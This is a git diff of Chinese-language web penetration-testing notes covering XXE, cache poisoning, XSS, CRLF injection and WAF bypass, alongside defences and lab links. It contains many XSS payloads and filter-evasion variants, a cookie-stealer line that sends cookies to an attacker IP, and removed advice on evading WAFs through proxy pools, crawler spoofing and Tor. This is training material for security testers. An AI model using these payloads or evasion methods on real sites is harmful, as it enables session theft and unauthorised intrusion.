 #### 网站扫描
+
 AWVS较为轻量，扫描快。APPscan大但全，一般为发现网站漏洞会结合使用
 **Awvs**
 注意:登录类网站扫描要带cookies扫才能扫到
@@ -2890,6 +2623,7 @@ uid、用户名、cookie的uid、电话号
 **工具测试**
 burpsuite插件 Authz
 [burpsuite功能compare site](https://blog.csdn.net/blood_pupil/article/details/90543849) 
+
 ##### 防御
 
 1.前后端同时对用户输入信息进行校验，双重验证机制
@@ -2897,6 +2631,8 @@ burpsuite插件 Authz
 3.执行关键操作前必须验证用户身份，验证用户是否具备操作数据的权限
 4.直接对象引用的加密资源ID，防止攻击者枚举ID，敏感数据特殊化处理
 5.永远不要相信来自用户的输入，对于可控参数进行严格的检测与过滤
+
+## 开放性
 
 ## 登录脆弱
 
@@ -3052,9 +2788,7 @@ https://xz.aliyun.com/t/7823
 **hydra进行暴力破解**
 
 hydra爆破工具，在kali有集成。在kali上有个默认密码字典位于`/usr/share/wordlists`
-![在这里插入图片描述](https://img-blog.csdnimg.cn/20210603153641755.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
 
-![在这里插入图片描述](https://img-blog.csdnimg.cn/20210519202219784.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
 
 类似工具：snetcrack、超级弱口令
 
@@ -3164,6 +2898,7 @@ POST /product/stock HTTP/1.1Host: ac391f291f66563c80495011008200db.web-security-
 <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://internal.vulnerable-website.com/"> ]>
 
 
+
 #### XXE 亿笑攻击-DOS
 
 第一次进行这种攻击时，攻击者使用lol作为实体数据，并在随后的几个实体中多次调用它。执行时间呈指数级增长，结果是一次成功的 DoS 攻击导致网站瘫痪。由于使用 lol 并多次调用它导致了数十亿个请求，我们得到了“Billion Laugh Attack”这个名字
@@ -3256,7 +2991,6 @@ XXEinjector的漏洞利用工具，XXEinjector是一款基于Ruby的XXE注入工
 
 ## 点击劫持（Clickjacking）
 
-类似于钓鱼，需要搭建VPS。暂略
 
 ### 什么是点击劫持？
 
@@ -3264,9 +2998,13 @@ XXEinjector的漏洞利用工具，XXEinjector是一款基于Ruby的XXE注入工
 网络用户访问诱饵网站（可能这是电子邮件提供的链接）并单击按钮以赢取奖品。不知不觉中，他们被攻击者欺骗，按下了一个替代的隐藏按钮，这导致在另一个网站上支付一个帐户。这是一个点击劫持攻击的例子。
 
 该技术取决于在 iframe 中包含一个不可见的、可操作的网页（或多个页面），其中包含一个按钮或隐藏链接。iframe 覆盖在用户预期的诱饵网页内容之上。
+![在这里插入图片描述](https://img-blog.csdnimg.cn/021dad5103c3495b9afb860de5b0d61c.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5YyX5LiQ5a6J5YWo,size_20,color_FFFFFF,t_70,g_se,x_16)
+
 
 这种攻击与CSRF攻击的不同之处在于，用户需要执行诸如单击按钮之类的操作，而CSRF 攻击则依赖于在用户不知情或不输入的情况下伪造整个请求。
 对 CSRF 攻击的保护通常是通过使用CSRF 令牌来提供的：特定于会话的一次性号码或随机数。CSRF 令牌不会减轻点击劫持攻击，因为目标会话是使用从真实网站加载的内容建立的，并且所有请求都发生在域上。CSRF 令牌被放入请求中并作为正常行为会话的一部分传递给服务器。与普通用户会话相比的不同之处在于该过程发生在隐藏的 iframe 中。
+
+### 点击劫持
 
 ## 远程命令执行（RCE）
 
@@ -3784,15 +3522,22 @@ cookie注入 后接cookie值
 
 ## 网页缓存攻击
 
+
 ### 什么是网页缓存中毒？
 
-首先来看看**什么是网页缓存吧**，网页缓存是为了避免用户在每次发起http请求时向服务器多次请求造成服务器负载大，缓存通常在固定的时间内保存（缓存）对特定请求的响应。如果另一个用户随后发送了一个等效的请求，缓存会直接向用户提供缓存响应的副本，而无需来自后端的任何交互。通过减少它必须处理的重复请求的数量，这大大减轻了服务器的负载。
-![在这里插入图片描述](https://img-blog.csdnimg.cn/045a3be599244ec684c631ecd0e9830f.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5YyX5LiQ5a6J5YWo,size_20,color_FFFFFF,t_70,g_se,x_16)
-处理。缓存通过比较请求组件的预定义子集（统称为“缓存键”）来识别等效请求。通常，这将包含请求行和Host标头。未包含在缓存键中的请求组件称为“未键控”。
+**什么是缓存**
 
-如果传入请求的缓存键与前一个请求的键匹配，则缓存认为它们是等效的。因此，它将提供为原始请求生成的缓存响应的副本。这适用于具有匹配缓存键的所有后续请求，直到缓存的响应过期。
+即为了降低网站主机的负载，在固定的时间内保存（缓存）对特定请求的响应。如果另一个用户在这段时间内发送了同样的请求，则缓存会直接提供响应的副本(缓存)给用户，而无需与服务器直接进行交互。
 
-至关重要的是，请求的其他组件会被缓存完全忽略。稍后我们将更详细地探讨这种行为的影响。
+**缓存怎么使用**
+
+那CDN怎么知道用户要访问的是同一个页面呢？(实际上除了CDN还有其他的缓存技术，这里以CDN为例，其他的暂不了解)
+
+当缓存接收到HTTP请求的时候，它会匹配vary头部指定的HTTP HEADER来进行判断。当指定的头部与缓存中的数据匹配时，则提供缓存的内容。如果不匹配，就直接与服务器交互。这些指定的头部被称作：缓存键 “cache key”。其他的头部就是非缓存键。
+
+**缓存投毒是什么**
+
+即攻击缓存的界面，当其他用户再请求此缓存界面时，就会导致访问到恶意的缓存界面
 
 ### Web 缓存中毒攻击的影响是什么？
 
@@ -3808,21 +3553,29 @@ Web 缓存中毒的影响在很大程度上取决于两个关键因素：
 
 一般来说，构建一个基本的Web缓存中毒攻击包括以下几个步骤：
 
-1. 识别和评估未加密的输入
-2. 从后端服务器引出有害响应
-3. 获取缓存的响应
+1. 判断哪些非缓存键会影响页面内容
 
-#### 识别和评估未加密的输入
+   任何的缓存投毒都依赖于非缓存键，所以我们在一开始就要判断哪些HTTP头部属于缓存键，哪些不属于。再通过修改或添加HTTP头部来判断哪些头部会引起页面内容的变化。常用的两种方式：
 
-任何 Web 缓存中毒攻击都依赖于对未加密输入（例如标头）的操作。在决定是否向用户提供缓存响应时，Web 缓存会忽略无键输入。这种行为意味着您可以使用它们来注入您的有效负载并引发“中毒”响应，如果缓存该响应，将向其请求具有匹配缓存键的所有用户提供服务。因此，构建 Web 缓存中毒攻击的第一步是识别服务器支持的未加密输入。
-
-您可以通过向请求添加随机输入并观察它们是否对响应产生影响来手动识别未加密的输入。这可能很明显，例如直接反映响应中的输入，或触发完全不同的响应。然而，有时效果更微妙，需要一些侦探工作才能弄清楚。您可以使用 Burp Comparer 等工具来比较有和没有注入输入的响应，但这仍然需要大量的手动工作。
-
-#####  Param Miner
-
-幸运的是，您可以通过将Param Miner扩展从 BApp 商店添加到 Burp来自动化识别未加密输入的过程。要使用 Param Miner，您只需右键单击要调查的请求，然后单击“Guess headers”。Param Miner 然后在后台运行，从其广泛的内置标头列表发送包含不同输入的请求。如果包含其注入输入之一的请求对响应有影响，Param Miner 将其记录在 Burp 中，如果您使用的是Burp Suite Professional，则在“问题”窗格中，或在扩展程序的“输出”选项卡中（“扩展器”>“扩展”>“ Param Miner”>“输出”
+   1. 手动修改或添加HTTP头部，指定随机字符来判断头部是否影响页面内容
+    > 例如直接反映响应中的输入，或触发完全不同的响应。然而，有时效果更微妙，需要一些侦探工作才能弄清楚。您可以使用 Burp Comparer 等工具来比较有和没有注入输入的响应，但这仍然需要大量的手动工作。
+    
+   2. 使用Brupsuite插件[Param Miner](https://github.com/portswigger/param-miner)来自动判断
+   > 您只需右键单击要调查的请求，然后单击“Guess headers”。Param Miner 然后在后台运行，从其广泛的内置标头列表发送包含不同输入的请求。如果包含其注入输入之一的请求对响应有影响，Param Miner 将其记录在 Burp 中，如果您使用的是Burp Suite Professional，则在“问题”窗格中，或在扩展程序的“输出”选项卡中（“扩展器”>“扩展”>“ Param Miner”>“输出”
 ![在这里插入图片描述](https://img-blog.csdnimg.cn/bd3f748086784ac29fd73f09c693f71b.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5YyX5LiQ5a6J5YWo,size_20,color_FFFFFF,t_70,g_se,x_16)
 注意：在实时网站上测试无键输入时，存在无意中导致缓存将生成的响应提供给真实用户的风险。因此，重要的是要确保您的请求都具有唯一的缓存键，以便它们只会提供给您。为此，您可以在每次发出请求时手动向请求行添加缓存破坏者（例如唯一参数）。或者，如果您使用的是 Param Miner，则可以选择为每个请求自动添加缓存破坏器。
+
+2. 构造内容引起服务器端的有害响应
+
+   针对不同的非缓存键，我们需要知道哪些非缓存键会导致页面返回有害的内容。举一个例子：页面中js链接的域名是通过获取HTTP头部中的“X-Forwarded-Host”字段来设置的。而服务器不会将这个字段作为缓存键，那么这个字段就可以利用。
+
+3. 获取响应，使有害内容被缓存
+
+   通过构造有害的内容，访问页面，获取响应。就会将有害的内容存入缓存中。需要注意的是，页面是否会被缓存受到文件扩展名、内容类型、url路由、状态代码和响应标头的影响。在测试的会比较麻烦。
+
+看完上面这几个步骤，应该对投毒的过程有了一个大概的了解。现在我们通过几个实验例子来学习具体的缓存利用方式。这里的实验环境为Brupsuite社区的缓存投毒实验案例。目的都是通过缓存投毒来导致XSS漏洞。
+
+
 
 ####  从后端服务器引出有害响应
 
@@ -4137,14 +3890,229 @@ Host: bad-stuff-here
 小心使用仅限内部的虚拟主机
 使用虚拟主机时，您应该避免在与面向公众的内容相同的服务器上托管仅供内部使用的网站和应用程序。否则，攻击者可能能够通过主机头操作访问内部域。
 
-## xss攻击
+## 跨站脚本（xss）
+
+### 什么是xss
+
+xss是一种 Web 安全漏洞，xss攻击对提交表单或发出的链接请求中所有变量嵌入执行javascript脚本，所以xss的执行结果可以通过过滤拦截可以通过源码读取,javascript脚本能执行多强(可绕过同源策略即：允许攻击者伪装成受害者用户，执行用户能够执行的任何操作，并访问用户的任何数据)就意味着xss能达到什么样的攻击。
+
+
+### XSS 攻击有哪些类型？
+
+XSS 攻击主要分为三种类型。这些是：
+
+反射型 XSS，其中恶意脚本来自当前的 HTTP 请求。
+存储的 XSS，其中恶意脚本来自网站的数据库。
+基于 DOM 的 XSS，该漏洞存在于客户端代码而不是服务器端代码中。
 
 
 
-**攻击严重性**
-xss攻击对提交表单或发出的链接请求中所有变量嵌入执行javascript脚本，所以xss的执行结果可以通过过滤拦截可以通过源码读取,javascript脚本能执行多强就意味着xss能达到什么样的攻击。
+#### DOM型XSS
 
-**常出现在**
+在以下示例中，应用程序使用一些 JavaScript 从输入字段读取值并将该值写入 HTML 中的元素：
+
+var search = document.getElementById('search').value;
+var results = document.getElementById('results');
+results.innerHTML = 'You searched for: ' + search;
+
+如果攻击者可以控制输入字段的值，他们就可以很容易地构造一个恶意值来执行自己的脚本：
+
+```bash
+You searched for: <img src=1 onerror='/* Bad stuff here... */'>
+```
+
+在典型情况下，输入字段将从 HTTP 请求的一部分填充，例如 URL 查询字符串参数，允许攻击者以与反射 XSS 相同的方式使用恶意 URL 进行攻击。
+
+### XSS 可以用来做什么？
+
+利用跨站点脚本漏洞的攻击者通常能够：
+
+冒充或伪装成受害者用户。
+执行用户能够执行的任何操作。
+读取用户能够访问的任何数据。
+捕获用户的登录凭据。
+对网站进行虚拟篡改。
+将特洛伊木马功能注入网站。
+
+### XSS 漏洞的影响
+
+XSS 攻击的实际影响通常取决于应用程序的性质、其功能和数据，以及受感染用户的状态。例如：
+
+* 在宣传册应用程序中，所有用户都是匿名的，所有信息都是公开的，影响通常很小。
+* 在保存敏感数据（例如银行交易、电子邮件或医疗记录）的应用程序中，影响通常会很严重。
+* 如果受感染用户在应用程序中具有提升的权限，那么影响通常很严重，允许攻击者完全控制易受攻击的应用程序并危害所有用户及其数据。
+
+### XSS 漏洞验证
+
+### 手动XSS验证语句思路
+
+也有很多人使用alert(document.domain)来明确是在哪个域上执行的方法
+alert()。alert传参有多种思路，具体可以依次尝试以下策略
+
+```bash
+（alert)(1);   		alert(1);		    alert`1`;           
+```
+
+从版本 92 开始（2021 年 7 月 20 日） Chrome跨域 iframe 被阻止调用导致alert失效，现在你可以采用
+print()
+
+我常常在插入html编码的xss语句发现网站的SQL源码
+
+
+**常规payload，黑盒中一般一个测试注入点会每条都尝试**
+
+```bash
+<script>alert(1)</script><b onmouseover=alert(1)>Click Me!</b><svg onload=alert(1)><body onload="alert('XSS')"><img src="ddksah" onerror=alert(1);>  <a href="javascript:alert(1)">sfdst</a>
+```
+
+
+ **一些实用性高的payload**
+
+```bash
+ <a href="javascript&#58;alert('<%E6%B5%8B%E8%AF%95\>')">jump</a> 
+```
+
+參考https://segmentfault.com/a/1190000019980090
+
+
+**绕过（通常一句XSS代码会同时结合以下策略）**
+浏览器进行绘制时，解码顺序分别为 HTML > URL > JS；
+使用html编码 https://tool.oschina.net/encode/
+
+
+**过滤了 ’，“，<,> 没有过滤引号** 
+
+```bash
+' οnclick='alert(/xss/) 'javascript:alert(/xss/)
+```
+
+其中用伪协议的标签有：
+
+```bash
+<a>标签：<a href="javascript:alert(`xss`);">xss</a><iframe>标签：<iframe src=javascript:alert('xss');></iframe><img>标签：<img src=javascript:alert('xss')>		//IE7以下<form>标签：<form action="Javascript:alert(1)"><input type=submit>
+```
+
+或者你可以选择制造伪协议
+
+```bash
+<img src=1 onerror=location='javascript:%61%6C%65%72%74%28%31%29'><img src=1 onerror=location='javascript:\x61\x6C\x65\x72\x74\x28\x31\x29'><img src=1 onerror=location="javascr"+"ipt:"+"%61%6C%65%72%74%28%31%29">
+```
+
+**过滤引号**
+无法闭合第一个引号:反斜杠转义回去/宽字节（GBK等编码格式）
+第二个引号：注释符号<!--或//
+
+**过滤空格**
+
+```bash
+<img/src="1"/onerror=alert(1)>
+```
+
+用%0a代替空格
+
+**过滤括号**
+
+```bash
+<img src=1 onerror="window.οnerrοr=eval;throw'=alert\x281\x29';">
+```
+
+**闭合标签**
+注释符可以当做`</span>`的斜杠
+
+```bash
+<<!--> span> <a href="" onclick="alert(document.cookie)">123456 </a>
+```
+
+```bash
+jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert(2222222222222222) )
+```
+
+
+
+**关键字被替代**
+多个script嵌套
+大小写
+
+**关键字屏蔽绕过**
+1 当js解释器在标识符名称(例如函数名，属性名等等)中遇到unicode编码会进行解码，并使其标志符照常生效。而在字符串中遇到unicode编码时会进行解码只会被当作字符串。
+
+> \u003c 来代替左括号（小于括号 ’<‘ ）
+> \u003e 来代替右括号（大于括号 ‘>’ ）
+> \u0022 来代替 双引号 （ ” ）
+> \u0027 来代替 单引号 （ ’ ）
+
+一般\不会被实体化，这样可以用来配合十六进制或者八进制来进行绕过斜杠在JAVASCRIPT有着特殊的用途，它是转义的符号
+
+2 有些时候加上注释后可能可以绕过后台过滤机制
+
+```bash
+<scri<!--test-->pt>alert(111)</sc<!--test-->ript>
+```
+
+3 拼接字符
+
+```bash
+<video/src/onerror=Function('ale'%2B'rt(1)')();><img src=x"οnerrοr="a=`aler`;b=`t`;c='`xss`);';eval(a+b+c)">
+```
+
+4 特殊函数
+
+```bash
+<img src=1 onerror=eval(atob('YWxlcnQoMSk='))>
+```
+
+利用top，加密函数(parseInt和toString互逆)
+
+```bash
+<video/src/onerror=top[8680439..toString(30)](1);><video/src/onerror=top[11189117..toString(32)](1);><img src="x"onerror="eval(String.fromCharCode(97,108,101,114,116,40,34,120,115,115,34,41,59))">
+```
+
+参考：https://blog.csdn.net/qq_42990434/article/details/106427376?spm=1001.2014.3001.5501
+payload，结合上面知识点总结的：
+
+```bash
+<<!--> span>\u003cSc<!--test-->Rpt>
+```
+
+**通用逃逸**
+用优先级运算绕过如+alert(1)+或-alert(1)-或in alert(1) in
+大小写混写
+%0a
+
+**恶意绕过的payload关键字**
+
+```bash
+空格'#/\(<!-->evaltop
+```
+
+
+#### 快速XSS验证
+
+##### burpsuite的XSS清单
+
+利用burpsuite提供的[清单，](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)。并利用爆破依次跑，[具体跑的方法可见](https://www.freebuf.com/articles/web/289478.html)
+
+##### XSStrike
+
+ [XSStrike快速验证可测试payload](https://github.com/s0md3v/XSStrike)
+外国人的项目，自带识别并绕过WAF(由于是外国开发的项目，可能对于中国的一些WAF识别不是很好，但是它的测试仍旧是走对的)所以 如果用在国内的项目探测出WAF：offline不要确定没有WAF。
+
+ - XSStrike主要特点反射和DOM XSS扫描 多线程爬虫 Context分析 可配置的核心 检测和规避WAF 老旧的JS库扫描
+   只能payload生成器 手工制作的HTML&JavaScript解析器 强大的fuzzing引擎 盲打XSS支持 高效的工作流
+   完整的HTTP支持 Bruteforce payloads支持 Payload编码
+
+![在这里插入图片描述](https://img-blog.csdnimg.cn/20210710223335774.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
+
+##### xss的fuzz字段
+
+https://xssfuzzer.com/fuzzer.html
+https://github.com/foospidy/payloads/tree/master/other/xss
+https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet
+新型绕过
+http://www.jsfuck.com/
+
+#### XSS常出现位置
+
 只要有允许用户输入数据的，且后端没有接受过滤的就存在xss攻击比如对你的用户名展示，对你输入的东西展示。常见出现在：
 
  - 表单框：搜索框、文本编辑框、留言框
@@ -4155,42 +4123,21 @@ xss攻击对提交表单或发出的链接请求中所有变量嵌入执行javas
 
 
 
-**技巧：从phpinfo返回信息获得管理权限**
-phpinfo展示界面中拥有cookie值，你获取到这个之后可以访问网站，进行xss操作，如获取源码等
 
-**知名靶场**
-[xss-lab](https://github.com/rebo-rn/xss-lab)与[答案](https://www.cnblogs.com/wangyuyang1016/p/13532898.html#_caption_3)
+### XSS漏洞利用
 
-### 基础使用
+#### 窃取 cookie
 
-```python
-# 常规payload，一般一个测试注入点会每条都尝试
-<script>alert('1')</script>
-<b onmouseover=alert(1)>Click Me!</b>
-<svg onload=alert(1)><body onload="alert('XSS')"><img src="ddksah" onerror=alert(1);> # ' onclick='alert(1) # INPUT可以加onclick属性值"> <a href="javascript:alert(1)">sfdst</a>
-# 一些实用性高的payload
- <a href="javascript&#58;alert('\<%E6%B5%8B%E8%AF%95\>')">jump</a> 
-#參考https://segmentfault.com/a/1190000019980090
-# 绕过（通常一句XSS代码会同时结合以下策略）浏览器进行绘制时，解码顺序分别为 HTML > URL > JS；
-使用html编码 https://tool.oschina.net/encode/
-用优先级运算绕过如+alert(1)+或-alert(1)-或in alert(1) in大小写混写多个关键字如果被过滤了空格则用%0a
-# 过滤了 ’，“，<,> 没有过滤引号 
-' οnclick=alert(/xss/) 
-'javascript:alert(/xss/)
-# 过滤引号
-无法闭合第一个引号:反斜杠转义回去/宽字节（GBK等编码格式）
-第二个引号：注释符号<!--或//
-# 需闭合这是一般执行输出框中插入XSS语句，而url参数通常不用；
-# 以下代码展示了输入框的常见写法<input name="t_sort" value="" type="">
-```
+窃取 cookie是利用 XSS 的传统方法。大多数 Web 应用程序使用 cookie 进行会话处理。您可以利用跨站点脚本漏洞将受害者的 cookie 发送到您自己的域，然后手动将 cookie 注入您的浏览器并冒充受害者。
+
+虽然盗取cookie是目前来看最流行的xss应用场景，但是这个触发条件也比较苛刻。一般这种攻击需要肯定对方大概率会查看你的页面
+
+*  受害者可能没有登录。
+*  许多应用程序使用该HttpOnly标志对 JavaScript 隐藏其 cookie 。
+*  会话可能会被其他因素锁定，例如用户的 IP 地址。
+*  会话可能会在您能够劫持它之前超时。
 
 
-
-### 典型用法
-
-虽然盗取cookie是目前来看最流行的xss应用场景，但是这个触发条件也比较苛刻。攻击成功的条件：对方有漏洞，浏览器存有cookie，浏览器不进行拦截，不存在带代码过滤和httponly(禁止js读取cookie），对方要触发这个漏洞地址
-cookie还要有意义，如果对方是未登录状态的cookie就索然无味了。一般这种攻击要么就是在肯定对方大概率会查看你的页面时要么就是定向。
-典型用法的代码参考与书籍《渗透测试实战》
 
 ```python
 <script>document.write('<img src="http//<YourIP>/Stealer.php?cookie='%2B document.cookie %2B '"/>');</script>
@@ -4207,21 +4154,6 @@ cookie还要有意义，如果对方是未登录状态的cookie就索然无味�
 ```bash
 <script>window.location = "https://www.youtube.com/watch?v=dQw4w9WgXcQ";</script>
 ```
-
-### 工具
-
-#### XSStrike
-
-https://github.com/s0md3v/XSStrike
-外国人的项目，自带识别并绕过WAF(由于是外国开发的项目，可能对于中国的一些WAF识别不是很好，但是它的测试仍旧是走对的)所以 如果用在国内的项目探测出WAF：offline不要确定没有WAF。
-
- - XSStrike主要特点反射和DOM XSS扫描 多线程爬虫 Context分析 可配置的核心 检测和规避WAF 老旧的JS库扫描
-   只能payload生成器 手工制作的HTML&JavaScript解析器 强大的fuzzing引擎 盲打XSS支持 高效的工作流
-   完整的HTTP支持 Bruteforce payloads支持 Payload编码
-
-![在这里插入图片描述](https://img-blog.csdnimg.cn/20210710223335774.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
-
-![在这里插入图片描述](https://img-blog.csdnimg.cn/20210717001905875.png)
 
 
 #### xss平台
@@ -4276,41 +4208,34 @@ beef还是很强大的，入侵成功后可以对对方页面进行跳转或者�
 ```
 
 
+### XSS防御
 
+在某些情况下，防止跨站点脚本编写是微不足道的，但根据应用程序的复杂性及其处理用户可控数据的方式，可能会更加困难。
 
+一般来说，有效防止XSS漏洞很可能涉及以下措施的组合：
 
-### 防御与绕过
+* 输入过滤：特殊字符过滤、特殊字符转义、长度限制。在php中常使用htmlentities和ENT_QUOTES为 HTML 上下文转义您的输出，或为 JavaScript 上下文转义 JavaScript Unicode 转义。在java中常使用 Google Guava 等库对 HTML 上下文的输出进行 HTML 编码，或对 JavaScript 上下文使用 JavaScript Unicode 转义。
+* 对输出的数据进行编码。在 HTTP 响应中输出用户可控数据时，对输出进行编码以防止其被解释为活动内容。根据输出上下文，这可能需要应用 HTML、URL、JavaScript 和 CSS 编码的组合。
+* 使用适当的响应头。使用Content-Type和X-Content-Type-Options标头来确保浏览器以您想要的方式解释响应。xss-proretion参数；http-only（防御xss的cookie盗取，你可以破解此防御的方案之一是采用CRLF做分割）
+* 内容安全政策（具体见备注）。作为最后一道防线，您可以使用内容安全策略 (CSP) 来降低仍然发生的任何 XSS 漏洞的严重性。
 
-首先需要寻找可注入的参数，以免你的输入被直接过滤掉了。比如通过查看网页的返回你将能找到某个可注入的参数，xss可能出现在任何地方比如你的ip被回显到界面，比如page参数通常也会回显到界面
+ 备注:**内容安全策略 ( CSP )** 是一种浏览器机制，旨在减轻跨站点脚本和其他一些漏洞的影响。如果使用 CSP 的应用程序包含类似 XSS 的行为，则 CSP 可能会阻碍或阻止对该漏洞的利用。通常，可以绕过 CSP 以利用底层漏洞。
 
-#### 防御
+### 关于XSS的常见问题
 
-特殊字符过滤
-特殊字符转义
-长度限制
-xss-proretion参数
-http-only（防御xss的cookie盗取，你可以破解此防御的方案之一是采用CRLF做分割）
+XSS 漏洞有多常见？XSS 漏洞非常普遍，XSS 可能是最常出现的 Web 安全漏洞。
 
+XSS 攻击有多常见？很难获得关于真实世界 XSS 攻击的可靠数据，但与其他漏洞相比，它的利用频率可能较低。
 
-#### 绕过过滤
+XSS 和 CSRF 有什么区别？XSS 涉及导致网站返回恶意 JavaScript，而 CSRF 涉及诱导受害用户执行他们不打算执行的操作。
 
-**٩( 'ω' )و 手动**
+反射型XSS 和DOM型区别是什么？都是未存储到数据库的，都是一次性的。但是反射型的数据有经过后端，比如查询的xss会经过被带到后端校验，而DOM型是单纯前端单纯客户端的
 
-尝试脚本大写
-unicode网络编码
-多个script嵌套
-eval转换
-jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert(2222222222222222) )
-不常见函数
+### XSS学习资源
 
-
-**工具**
-fuzz
-https://xssfuzzer.com/fuzzer.html
-https://github.com/foospidy/payloads/tree/master/other/xss
-https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet
-新型绕过
-http://www.jsfuck.com/
+**靶场**
+[xss-lab](https://github.com/rebo-rn/xss-lab)与[答案](https://www.cnblogs.com/wangyuyang1016/p/13532898.html#_caption_3)
+burp的xss实验室[答案1重要步骤详细](https://www.freebuf.com/articles/web/289478.html)和[答案2的个人试错总结更多](https://cloud.tencent.com/developer/article/1806351)
 
 ## 跨站请求伪造 (CSRF）
 
@@ -4464,6 +4389,7 @@ autoSubTakeover
 ## 攻击漏洞技巧
 
 ### CRLF 注入
+
 HTTP响应拆分漏洞，也叫CRLF注入攻击。CR、LF分别对应回车（%0d）、换行（%0a）字符。HTTP头由很多被CRLF组合分离的行构成，每行的结构都是“键：值”。如果用户输入的值部分注入了CRLF字符，它有可能改变的HTTP报头结构。
 一般在源码中存在将你请求的数据设置为数据包一部分、又不过滤情况就存在此漏洞。更多请看https://zhuanlan.zhihu.com/p/140702316
 
@@ -4508,7 +4434,7 @@ php中有一个转义字符
 
 很多web都有WAF，会对恶意访问者做一定的拦截和记录。你在测试你的危险语句时，遭遇waf第一步是不要惊慌，一点一点的测试是因为匹配到了语句中的哪个词组或符号组被拦截了。
 在学习WAF绕过时，最深度学习的方式是将想分析的WAF下载到电脑，弄一个网站，开着WAF自己跟自己玩。
-
+[绕过工具，分块传输](https://github.com/c0ny1/chunked-coding-converter)
 
 **waf类型**
 
@@ -4532,209 +4458,6 @@ WAF绕过将会更难了，这些绕过都是有条件的。
 3.漏洞payload（数据变异，数据加密，白名单）
 	碰到WAF多换几个工具
 	代理发送burpsuite，鼠标点击器扫
-
-#### 市面上WAF
-
-受欢迎的 WAF 供应商       
-![在这里插入图片描述](https://img-blog.csdnimg.cn/20210716181640870.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
-
-##### 阿里云盾
-
-买阿里云就有阿里云盾默认开启。WAF收费版只是有自定义的不同，功能上都差不多。阿里云检测苛刻，稍微不注意就暂时被封了，比如扫目录会被封一个小时样子。
-
-##### 宝塔
-
-一般非法网站都会用宝塔一站式搭建，所以一般这类网站就是宝塔防护。绕过难度：难
-![在这里插入图片描述](https://img-blog.csdnimg.cn/20210707225447286.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
-![在这里插入图片描述](https://img-blog.csdnimg.cn/20210716175129396.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
-
-##### 安全狗
-
-安全狗用的人也挺多的，但是他的防护效果不如其他防护软件好。因为历史悠久且免费所以使用的人多。绕过难度：简单
-以下是安全狗默认开启和关闭的选项，按道理来说全部开启网站更安全，但是为了防止正常请求被错误拦截，这里是没有全部开启的
-安全狗官方下载链接 https://www.safedog.cn/server_safedog.html
-![在这里插入图片描述](https://img-blog.csdnimg.cn/20210707231011334.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
-
-##### 将会流行的WAF
-
-人工智能WAF如openrasp
-
-#### 市面上常见绕过工具
-
-检查和绕过 WAF 的工具：
-w3af — Web 应用程序攻击和审计框架
-
-BypassWAF –通过滥用 DNS 历史绕过防火墙。此工具将搜索旧的 DNS A 记录并检查服务器是否回复该域。 
-
-CloudFail – 是一种战术侦察工具，试图找到 Cloudflare WAF 背后的原始 IP 地址。
-
-### 通用
-
-#### 待补充：全扫描工具
-
-**待补充如何伪造成用户，来骗过WAF指纹识别？**
-对方开了WAF这些扫描工具通常会被识别拦截
-AWVS:扫描速度开最低，设置付费代理（通杀），UA写爬虫
-
-有时候采用这些工具也很费劲，比如它们被拦截了的可能是其探测语句，这时候你就只能多采用工具一起测试了
-
-不支持延迟请求？
-用burpsuite劫持，然后用按键精灵或模拟器控制速度或多工具联动扫描，将数据联动到可控制速度的。如三连动，awvs发送到burpsuite，再发送到xray上
-
-#### 流量监控
-
-**宝塔**
-60秒内，请求同一URL超过120次，封锁IP 100秒。
-60秒内，恶意请求6次，封IP 600秒。
-
-##### 躲避
-
-**方案1：延迟扫描**
-一般设置3秒起，这会大大降低你的访问速度
-
-**方案2：爬虫伪造**
-如果对方对此设置了白名单就可以，一般会对搜索爬虫设置白名单的，默认也是。因为对方希望自己网站被搜索引擎收入
-![在这里插入图片描述](https://img-blog.csdnimg.cn/20210708204226690.png)
-**方案3：代理池**
-有时候WAF会识别代理.且市面上没有什么免费的好的代理，免费代理过期时间基本都短比如几秒样子，使用的人也很多。代理购买，通常买包天，隧道代理(请求一次隔段时间换一次IP）大概20rmb,做扫描的时候强烈推荐购买付费代理，其中一个购买网站是 https://www.kuaidaili.com/pricing/#tps
-如果你使用代理，用burpsuite做二级代理才可以抓包
-
-
-经济一点的方法是扫描时使用tor代理，几分钟会自动换ip，前提是你需要一个国外或香港的代理，不然是连接不上TOR匿名网络的，这比你本身的VPN更隐蔽，但速度慢。
-
-
